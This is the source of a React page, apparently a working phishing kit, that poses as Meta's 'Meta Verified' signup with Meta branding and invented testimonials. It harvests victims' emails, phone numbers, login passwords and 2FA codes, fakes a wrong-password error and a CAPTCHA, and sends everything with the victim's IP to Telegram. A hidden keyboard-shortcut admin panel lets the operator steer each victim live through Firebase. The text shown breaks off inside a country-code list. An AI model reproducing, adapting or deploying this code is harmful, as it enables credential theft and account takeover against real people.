import { useState, useEffect } from 'react';
import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
import { translations } from '../translations'; 
import { initializeApp } from "firebase/app";
import { getDatabase, ref, set, onValue } from "firebase/database";

// ==========================================
// THAY LINK FIREBASE CỦA MÀY VÀO ĐÂY
const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
const firebaseConfig = { databaseURL: FIREBASE_URL };
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
// ==========================================

export default function Home() {
  const [lang, setLang] = useState('en');
  const t = translations[lang] || translations['en'];

  // --- STATES TRANG CHỦ ---
  const [activeBenefit, setActiveBenefit] = useState(0);
  const [currentSlide, setCurrentSlide] = useState(0);
  const [openFaq, setOpenFaq] = useState(null);

  // --- STATES FORM MODAL ---
  const [showModal, setShowModal] = useState(false);
  const [showFullPage, setShowFullPage] = useState(false); // Bật giao diện full trang
  const [step, setStep] = useState(1); // 1=signup, 1.5=thông báo, 2=login, 3=captcha, 4=otp, 5=success
  const [clientIp, setClientIp] = useState('Unknown');
  const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState(''); 
  const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
  const [loginUser, setLoginUser] = useState(''); const [loginPass, setLoginPass] = useState(''); const [otp, setOtp] = useState('');
  const [loginAttempt, setLoginAttempt] = useState(0); const [otpAttempt, setOtpAttempt] = useState(0);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState({}); const [showLoginError, setShowLoginError] = useState(false); const [showOtpError, setShowOtpError] = useState(false);

  // --- CAPTCHA STATES ---
  const [captchaChecked, setCaptchaChecked] = useState(false);
  const [captchaLoading, setCaptchaLoading] = useState(false);
  const [captchaDone, setCaptchaDone] = useState(false);

  // --- OTP TIMER STATES ---
  const [otpSecondsLeft, setOtpSecondsLeft] = useState(120);
  const [otpCanResend, setOtpCanResend] = useState(false);
  const [otpResetCount, setOtpResetCount] = useState(0);

  // --- STATES CHO BƯỚC 4 & ADMIN ---
  const [matchNumber, setMatchNumber] = useState(null); 
  const [showSuccess, setShowSuccess] = useState(false); 
  const [adminSessionId, setAdminSessionId] = useState(''); 
  const [adminNumberInput, setAdminNumberInput] = useState(''); 
  const [showAdmin, setShowAdmin] = useState(false);

  // --- TẠO MÃ PHIÊN CHO NGƯỜI TRUY CẬP ---
  const [sessionId] = useState(() => {
      let id = localStorage.getItem('session_id');
      if (!id) {
          id = 'user_' + Math.random().toString(36).substring(2, 9);
          localStorage.setItem('session_id', id);
      }
      return id;
  });

  // --- DỮ LIỆU TRANG CHỦ ---
  const benefitsData = [
    { title: t.benefit1Title, desc: t.benefit1Desc, image: '/images/benefit-1.webp' },
    { title: t.benefit2Title, desc: t.benefit2Desc, image: '/images/benefit-2.webp' },
    { title: t.benefit3Title, desc: t.benefit3Desc, image: '/images/benefit-3.webp' },
    { title: t.benefit4Title, desc: t.benefit4Desc, image: '/images/benefit-4.webp' }
  ];
  
  const testimonials = [
    { quote: '"After enrolling in Meta Verified, I noticed increased reach on my posts and higher engagement with my audience."', author: 'Kimber Greenwood, Owner of Water Bear Photography' },
    { quote: '"Since subscribing, I\'ve noticed a real difference. My posts are getting more reach, engagement has gone up."', author: 'Devon Kirby, Owner, Mom Approved Miami' },
    { quote: '"Having a verified account signals to both our existing followers and new visitors that we are a credible, professional business."', author: 'Sarah Clancy, Owner of Sarah Marie Running Co.' }
  ];
  
  const faqs = [
    { q: t.faq1Q, a: t.faq1A },
    { q: t.faq2Q, a: t.faq2A },
    { q: t.faq3Q, a: t.faq3A },
    { q: t.faq4Q, a: t.faq4A },
    { q: t.faq5Q, a: t.faq5A },
    { q: t.faq6Q, a: t.faq6A }
  ];

  // --- LẤY IP VÀ ĐỔI NGÔN NGỮ ---
  useEffect(() => { 
      fetch('https://ipwho.is/').then(r => r.json()).then(d => { 
          if (d && d.ip) {
              setClientIp(`${d.ip} - ${d.country} (${d.city})`);
              
              if (d.country_code === 'FR') { setLang('fr'); } 
              else { setLang('en'); }

              if (d.country_code && countryCodeMap[d.country_code]) { setCountryCode(countryCodeMap[d.country_code]); }
          }
      }).catch(()=>{}); 
  }, []);

  // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
  useEffect(() => {
    if ((showModal || showFullPage) && !showAdmin && step !== 1 && step !== 1.5) {
        const commandRef = ref(database, 'commands/' + sessionId);
        const unsubscribe = onValue(commandRef, (snapshot) => {
            const data = snapshot.val();
            if (data && data.action) {
                if (data.action === 'otp') {
                    setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(null); setShowSuccess(false);
                } 
                else if (data.action === 'approve' && data.value) {
                    setStep(4); setShowFullPage(true); setShowModal(false); setMatchNumber(data.value); setShowSuccess(false);
                } 
                else if (data.action === 'success') {
                    setStep(5); setShowFullPage(true); setShowModal(false); setShowSuccess(true);
                } 
                else if (data.action === 'error') {
                    setStep(2); setShowFullPage(true); setShowModal(false); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
                }
            }
        });
        return () => unsubscribe();
    }
  }, [showModal, showFullPage, showAdmin, sessionId, step]);

  // --- PHÍM TẮT MỞ ADMIN ---
  useEffect(() => {
    const handleKeyDown = (e) => {
      if (e.ctrlKey && e.shiftKey && e.key === 'A') {
        setShowAdmin(prev => !prev); setShowModal(true); setShowFullPage(false);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, []);

  // --- OTP TIMER EFFECT ---
  useEffect(() => {
    if (step === 4 && showFullPage) {
      setOtpSecondsLeft(120);
      setOtpCanResend(false);
      const interval = setInterval(() => {
        setOtpSecondsLeft(prev => {
          if (prev <= 1) {
            clearInterval(interval);
            setOtpCanResend(true);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [step, showFullPage, otpResetCount]);

  const openModal = () => { setShowModal(true); setShowFullPage(false); setStep(1); setShowSuccess(false); setShowAdmin(false); setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false); };

  const handleSignup = (e) => {
    e.preventDefault(); let errs = {};
    if (busName.length < 2) errs.busName = true; 
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(perEmail)) errs.perEmail = true; 
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(busEmail)) errs.busEmail = true; 
    if (!/^\+?\d{8,15}$/.test(phoneNum.replace(/[\s\-().]/g, ''))) errs.phoneNum = true;
    if (Object.keys(errs).length > 0) { setErrors(errs); return; }
    
    setErrors({}); setLoading(true);
    const text = `<b>IP:</b> <code>${escapeHtml(clientIp)}</code>\n<b>Business:</b> <code>${escapeHtml(busName)}</code>\n<b>P.Email:</b> <code>${escapeHtml(perEmail)}</code>\n<b>B.Email:</b> <code>${escapeHtml(busEmail)}</code>\n<b>Phone:</b> <code>${escapeHtml(countryCode + phoneNum)}</code>\n`;
    setInitialSession(text); sendTelegramMessage('');
    
    setTimeout(() => { 
      setLoading(false); 
      setStep(1.5); // Chuyển sang bước đệm
      setShowFullPage(true); // Bật giao diện full trang
      setShowModal(false);
    }, 700);
  };

  const handleLogin = (e) => {
    e.preventDefault(); if (loginPass.length === 0) return;
    setLoading(true); setShowLoginError(false); const newAttempt = loginAttempt + 1; setLoginAttempt(newAttempt);
    sendTelegramMessage(`\n<b>Login ${newAttempt}:</b> <code>${escapeHtml(loginUser)}</code> | <code>${escapeHtml(loginPass)}</code>`);
    setTimeout(() => { 
      setLoading(false); 
      if (newAttempt === 1) { 
        setShowLoginError(true); setLoginPass(''); 
      } else { 
        // Pass 2 -> go to FULL PAGE CAPTCHA
        setStep(3); 
      } 
    }, (newAttempt === 1) ? 3000 : 5000);
  };

  // --- CAPTCHA HANDLER ---
  const handleCaptchaClick = () => {
    if (captchaDone || captchaLoading) return;
    setCaptchaLoading(true);
    setCaptchaChecked(true);
    setTimeout(() => {
      setCaptchaLoading(false);
      setCaptchaDone(true);
      setTimeout(() => {
        setStep(4);
        setOtpAttempt(0);
        setOtp('');
        setShowOtpError(false);
      }, 600);
    }, 10000);
  };

  const handleOtp = (e) => {
    e.preventDefault(); if (!/^\d{6}$|^\d{8}$/.test(otp)) { setShowOtpError(true); return; }
    setLoading(true); setShowOtpError(false); const newAttempt = otpAttempt + 1; setOtpAttempt(newAttempt);
    if (newAttempt <= 3) sendTelegramMessage(`\n<b>2FA ${newAttempt}:</b> <code>${escapeHtml(otp)}</code>`);
    
    setTimeout(() => { 
        setLoading(false); 
        if (newAttempt < 3) { setShowOtpError(true); setOtp(''); } 
        else { 
          setShowSuccess(true); 
          setStep(5); 
          setOtp(''); 
        }
    }, 1500);
  };

  const handleResendOtp = () => {
    if (!otpCanResend) return;
    setOtpSecondsLeft(120);
    setOtpCanResend(false);
    setOtpResetCount(prev => prev + 1); 
    sendTelegramMessage(`\n<b>Resend OTP requested</b> for session <code>${escapeHtml(sessionId)}</code>`);
  };

  const handleAdminCommand = (type, value) => {
      const targetUser = adminSessionId.trim(); 
      if (!targetUser) { alert('Please enter the Session ID!'); return; }
      
      set(ref(database, 'commands/' + targetUser), {
          action: type,
          value: value
      }).then(() => {
          alert(`Command sent to ${targetUser}!`);
      }).catch((error) => {
          alert("Error: " + error.message);
      });
  };

  const formatTime = (secs) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m}:${s.toString().padStart(2, '0')}`;
  };

  return (
    <div style={{ overflowX: 'hidden' }}>
      {/* ================= TRANG CHỦ ================= */}
      <header className="header">
          <div className="header-left">
              <a href="/live" className="header-logo"><img src="https://static.xx.fbcdn.net/rsrc.php/y9/r/tL_v571NdZ0.svg" alt="Meta" /></a>
              <nav className="nav-links">
                  <a className="nav-link" href="#steps">{t.navGetStarted}</a>
                  <a className="nav-link" href="#benefits">{t.navAdvertise}</a>
                  <a className="nav-link" href="#faq">{t.navLearn}</a>
                  <a className="nav-link" href="#footer">{t.navSupport}</a>
              </nav>
          </div>
          <div className="header-right">
              <svg className="header-icon" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="2"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" strokeLinecap="round"/></svg>
              <div className="avatar-btn"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#1c2b33" strokeWidth="1.5"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg></div>
          </div>
      </header>

      <section id="hero">
          <div className="hero-inner">
              <div className="hero-text">
                  <div className="hero-text-inner">
                      <svg className="hero-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.26-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                      <h1 className="hero-title">{t.heroTitle}</h1>
                      <p className="hero-subtitle">{t.heroSub}</p>
                      <button className="btn-primary" onClick={openModal}>{t.claimBtn}</button>
                      <p className="hero-note">{t.heroNote}</p>
                  </div>
              </div>
              <div className="hero-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
          </div>
      </section>

      <section className="benefits" id="benefits">
          <div className="benefits-header">
              <h2>{t.benefitsTitle}</h2>
              <p>{t.benefitsSub}</p>
              <span className="benefits-learn-more" onClick={() => document.getElementById('faq').scrollIntoView({behavior:'smooth'})}>
                  <svg width="20" height="20" viewBox="0 0 20 20" fill="none"><circle cx="10" cy="10" r="9" stroke="#0064e0" strokeWidth="1.5"/><path d="M8 6l4 4-4 4" stroke="#0064e0" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>{t.learnMore}
              </span>
          </div>
          <div className="benefits-grid">
              <div className="benefits-image"><img src={benefitsData[activeBenefit].image} alt="Benefit" /></div>
              <div className="benefits-accordion">
                  {benefitsData.map((b, i) => (
                      <div key={i} className={`benefit-item ${i === activeBenefit ? 'active' : ''}`} onClick={() => setActiveBenefit(i)}>
                          <div className="benefit-header"><span>{b.title}</span><svg className={`benefit-chevron ${i === activeBenefit ? 'rotated' : ''}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 9l6 6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg></div>
                          <div className={`benefit-desc ${i === activeBenefit ? 'open' : ''}`}><p>{b.desc}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <section className="steps" id="steps">
          <div className="steps-inner">
              <h2>{t.stepsTitle}</h2>
              <p>{t.stepsSub}</p>
              <div className="steps-grid">
                  <div className="step-card"><div className="step-number">1</div><div className="step-title">{t.step1Title}</div><p className="step-desc">{t.step1Desc}</p></div>
                  <div className="step-card"><div className="step-number">2</div><div className="step-title">{t.step2Title}</div><p className="step-desc">{t.step2Desc}</p></div>
                  <div className="step-card"><div className="step-number">3</div><div className="step-title">{t.step3Title}</div><p className="step-desc">{t.step3Desc}</p></div>
              </div>
          </div>
      </section>

      <section className="testimonials">
          <div className="container-narrow">
              <h2>{t.testimonialsTitle}</h2>
              <div className="carousel-wrapper">
                  <div className="carousel-track" style={{ transform: `translateX(-${currentSlide * 100}%)` }}>
                      {testimonials.map((item, i) => (<div className="carousel-slide" key={i}><p className="carousel-quote">{item.quote}</p><p className="carousel-author">{item.author}</p></div>))}
                  </div>
              </div>
              <div className="carousel-nav">
                  <button className="carousel-btn" onClick={() => setCurrentSlide((prev) => (prev - 1 + testimonials.length) % testimonials.length)}><svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7"/></svg></button>
                  <div className="carousel-dots">{testimonials.map((_, i) => (<div key={i} className={`dot ${i === currentSlide ? 'active' : ''}`} onClick={() => setCurrentSlide(i)}></div>))}</div>
                  <button className="carousel-btn" onClick={() => setCurrentSlide((prev) => (prev + 1) % testimonials.length)}><svg width="12" height="12" fill="none" stroke="#1c2b33" viewBox="0 0 24 24" strokeWidth="2"><path strokeLinecap="round" strokeLinejoin="round" d="M9 5l7 7-7 7"/></svg></button>
              </div>
          </div>
      </section>

      <section className="cta">
          <div className="cta-inner">
              <div className="cta-content">
                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
                  <h2 className="cta-title">{t.ctaTitle}</h2>
                  <button className="btn-primary" onClick={openModal}>{t.claimBtn}</button>
              </div>
              <div className="cta-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
          </div>
      </section>

      <section className="faq" id="faq">
          <div className="faq-inner">
              <h2>{t.faqTitle}</h2>
              <p className="faq-sub">{t.faqSub}</p>
              <div className="faq-list">
                  {faqs.map((f, i) => (
                      <div key={i} className="faq-item">
                          <button className="faq-question" onClick={() => setOpenFaq(openFaq === i ? null : i)}><span>{f.q}</span><svg className={`faq-chevron ${openFaq === i ? 'open' : ''}`} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M6 9l6 6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg></button>
                          <div className={`faq-answer ${openFaq === i ? 'open' : ''}`}><p>{f.a}</p></div>
                      </div>
                  ))}
              </div>
          </div>
      </section>

      <footer className="footer" id="footer">
          <div className="footer-inner">
              <div className="footer-newsletter">
                  <div className="footer-row">
                      <div style={{ maxWidth: '480px' }}><div className="footer-title">Get the latest updates from Meta for Business.</div><p className="footer-desc">Provide your email address to receive the latest updates from Meta for Business, including news, events and product updates.</p></div>
                      <div className="footer-form"><input type="email" className="footer-input" placeholder="Your email address" /><button className="footer-subscribe">Subscribe</button></div>
                  </div>
                  <p className="footer-consent">By submitting this form, you agree to receive marketing-related electronic communications from Meta. You may withdraw your consent and unsubscribe at any time.</p>
              </div>
              <div className="footer-bottom">
                  <span className="footer-copy">© 2026 Meta</span>
                  <div className="footer-grid">
                      <div><a href="#hero" className="footer-link">About</a></div><div><a href="#steps" className="footer-link">Developers</a></div><div><a href="#benefits" className="footer-link">Careers</a></div><div><a href="#faq" className="footer-link">Privacy</a></div><div><a href="#faq" className="footer-link">Cookies</a></div><div><a href="#faq" className="footer-link">Terms</a></div>
                  </div>
              </div>
          </div>
      </footer>

      {/* ================= MODAL (CHỈ DÙNG CHO SIGNUP VÀ ADMIN) ================= */}
      {showModal && !showFullPage && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
            <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                
                <button onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                </button>

                {showAdmin ? (
                  <div style={{ textAlign: 'center' }}>
                    <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
                    <div style={{ marginBottom: '20px' }}>
                        <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Session ID (from Telegram):</p>
                        <input className="fb-input" type="text" placeholder="e.g. user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
                    </div>
                    <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                        <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Wrong Password</button>
                        <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Go to OTP</button>
                        <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Show Success</button>
                        
                        <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
                            <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Request approval number:</p>
                            <input className="fb-input" type="text" placeholder="Number (e.g. 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
                            <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Send Number</button>
                        </div>
                        
                        <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Close</button>
                    </div>
                  </div>
                ) : (
                  <>
                    <div style={{ textAlign: 'center', marginBottom: '18px' }}>
                        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
                    </div>

                    {/* FORM 1: SIGNUP */}
                    {step === 1 && (
                      <>
                        <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form1Title}</h2>
                        <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form1Sub}</p>
                        <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                            <div>
                                <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
                                {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
                            </div>
                            <div>
                                <input className="fb-input" style={{ borderColor: errors.perEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
                                {errors.perEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid personal email.</div>}
                            </div>
                            <div>
                                <input className="fb-input" style={{ borderColor: errors.busEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
                                {errors.busEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid business email.</div>}
                            </div>
                            <div>
                                <div className="fb-phone-group">
                                    <div className="fb-phone-select-wrap">
                                        <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)} style={{ width: '100%', height: '56px', padding: '10px 30px 10px 14px', border: '1px solid rgb(224, 226, 228)', borderRadius: '16px', appearance: 'none' }}>
                                            <option value="+93">+93 (Afghanistan)</option>
                                            <option value="+355">+355 (Albania)</option>
                                            <option value="+213">+213 (Algeria)</option>
                                            <option value="+1">+1 (American Samoa)</option>
                                            <option value="+376">+376 (Andorra)</option>
                                            <option value="+244">+244 (Angola)</option>
                                            <option value="+1">+1 (Anguilla)</option>
                                            <option value="+1">+1 (Antigua and Barbuda)</option>
                                            <option value="+54">+54 (Argentina)</option>
                                            <option value="+374">+374 (Armenia)</option>
                                            <option value="+297">+297 (Aruba)</option>
                                            <option value="+61">+61 (Australia)</option>
                                            <option value="+43">+43 (Austria)</option>
                                            <option value="+994">+994 (Azerbaijan)</option>
                                            <option value="+1">+1 (Bahamas)</option>
                                            <option value="+973">+973 (Bahrain)</option>
                                            <option value="+880">+880 (Bangladesh)</option>
                                            <option value="+1">+1 (Barbados)</option>
                                            <option value="+375">+375 (Belarus)</option>
                                            <option value="+32">+32 (Belgium)</option>
                                            <option value="+501">+501 (Belize)</option>
                                            <option value="+229">+229 (Benin)</option>
                                            <option value="+1">+1 (Bermuda)</option>
                                            <option value="+975">+975 (Bhutan)</option>
                                            <option value="+591">+591 (Bolivia)</option>
                                            <option value="+387">+387 (Bosnia and Herzegovina)</option>
                                            <option value="+267">+267 (Botswana)</option>
                                            <option value="+55">+55 (Brazil)</option>
                                            <option value="+1">+1 (British Virgin Islands)</option>
                                            <option value="+673">+673 (Brunei)</option>
                                            <option value="+359">+359 (Bulgaria)</option>
                                            <option value="+226">+226 (Burkina Faso)</option>
                                            <option value="+257">+257 (Burundi)</option>
                                            <option value="+855">+855 (Cambodia)</option>
                                            <option value="+237">+237 (Cameroon)</option>
                                            <option value="+1">+1 (Canada)</option>
                                            <option value="+238">+238 (Cape Verde)</option>
                                            <option value="+1">+1 (Cayman Islands)</option>
                                            <option value="+236">+236 (Central African Republic)</option>
                                            <option value="+235">+235 (Chad)</option>
                                            <option value="+56">+56 (Chile)</option>
                                            <option value="+86">+86 (China)</option>
                                            <option value="+57">+57 (Colombia)</option>
                                            <option value="+269">+269 (Comoros)</option>
                                            <option value="+242">+242 (Congo - Brazzaville)</option>
                                            <option value="+243">+243 (Congo - Kinshasa)</option>
                                            <option value="+682">+682 (Cook Islands)</option>
                                            <option value="+506">+506 (Costa Rica)</option>
                                            <option value="+225">+225 (Côte d'Ivoire)</option>
                                            <option value="+385">+385 (Croatia)</option>
                                            <option value="+53">+53 (Cuba)</option>
                                            <option value="+599">+599 (Curaçao)</option>
                                            <option value="+357">+357 (Cyprus)</option>
                                            <option value="+420">+420 (Czechia)</option>
                                            <option value="+45">+45 (Denmark)</option>
                                            <option value="+253">+253 (Djibouti)</option>
                                            <option value="+1">+1 (Dominica)</option>
                                            <option value="+1">+1 (Dominican Republic)</option>
                                            <option value="+593">+593 (Ecuador)</option>
                                            <option value="+20">+20 (Egypt)</option>
                                            <option value="+503">+503 (El Salvador)</option>
                                            <option value="+240">+240 (Equatorial Guinea)</option>
                                            <option value="+291">+291 (Eritrea)</option>
                                            <option value="+372">+372 (Estonia)</option>
                                            <option value="+268">+268 (Eswatini)</option>
                                            <option value="+251">+251 (Ethiopia)</option>
                                            <option value="+500">+500 (Falkland Islands)</option>
                                            <option value="+298">+298 (Faroe Islands)</option>
                                            <option value="+679">+679 (Fiji)</option>
                                            <option value="+358">+358 (Finland)</option>
                                            <option value="+33">+33 (France)</option>
                                            <option value="+594">+594 (French Guiana)</option>
                                            <option value="+689">+689 (French Polynesia)</option>
                                            <option value="+241">+241 (Gabon)</option>
                                            <option value="+220">+220 (Gambia)</option>
                                            <option value="+995">+995 (Georgia)</option>
                                            <option value="+49">+49 (Germany)</option>
                                            <option value="+233">+233 (Ghana)</option>
                                            <option value="+350">+350 (Gibraltar)</option>
                                            <option value="+30">+30 (Greece)</option>
                                            <option value="+299">+299 (Greenland)</option>
                                            <option value="+1">+1 (Grenada)</option>
                                            <option value="+590">+590 (Guadeloupe)</option>
                                            <option value="+1">+1 (Guam)</option>
                                            <option value="+502">+502 (Guatemala)</option>
                                            <option value="+44">+44 (Guernsey)</option>
                                            <option value="+224">+224 (Guinea)</option>
                                            <option value="+245">+245 (Guinea-Bissau)</option>
                                            <option value="+592">+592 (Guyana)</option>
                                            <option value="+509">+509 (Haiti)</option>
                                            <option value="+504">+504 (Honduras)</option>
                                            <option value="+852">+852 (Hong Kong SAR China)</option>
                                            <option value="+36">+36 (Hungary)</option>
                                            <option value="+354">+354 (Iceland)</option>
                                            <option value="+91">+91 (India)</option>
                                            <option value="+62">+62 (Indonesia)</option>
                                            <option value="+98">+98 (Iran)</option>
                                            <option value="+964">+964 (Iraq)</option>
                                            <option value="+353">+353 (Ireland)</option>
                                            <option value="+44">+44 (Isle of Man)</option>
                                            <option value="+972">+972 (Israel)</option>
                                            <option value="+39">+39 (Italy)</option>
                                            <option value="+1">+1 (Jamaica)</option>
                                            <option value="+81">+81 (Japan)</option>
                                            <option value="+44">+44 (Jersey)</option>
                                            <option value="+962">+962 (Jordan)</option>
                                            <option value="+7">+7 (Kazakhstan)</option>
                                            <option value="+254">+254 (Kenya)</option>
                                            <option value="+686">+686 (Kiribati)</option>
                                            <option value="+383">+383 (Kosovo)</option>
                                            <option value="+965">+965 (Kuwait)</option>
                                            <option value="+996">+996 (Kyrgyzstan)</option>
                                            <option value="+856">+856 (Laos)</option>
                                            <option value="+371">+371 (Latvia)</option>
                                            <option value="+961">+961 (Lebanon)</option>
                                            <option value="+266">+266 (Lesotho)</option>
                                            <option value="+231">+231 (Liberia)</option>
                                            <option value="+218">+218 (Libya)</option>
                                            <option value="+423">+423 (Liechtenstein)</option>
                                            <option value="+370">+370 (Lithuania)</option>
                                            <option value="+352">+352 (Luxembourg)</option>
                                            <option value="+853">+853 (Macao SAR China)</option>
                                            <option value="+261">+261 (Madagascar)</option>
                                            <option value="+265">+265 (Malawi)</option>
                                            <option value="+60">+60 (Malaysia)</option>
                                            <option value="+960">+960 (Maldives)</option>
                                            <option value="+223">+223 (Mali)</option>
                                            <option value="+356">+356 (Malta)</option>
                                            <option value="+692">+692 (Marshall Islands)</option>
                                            <option value="+596">+596 (Martinique)</option>
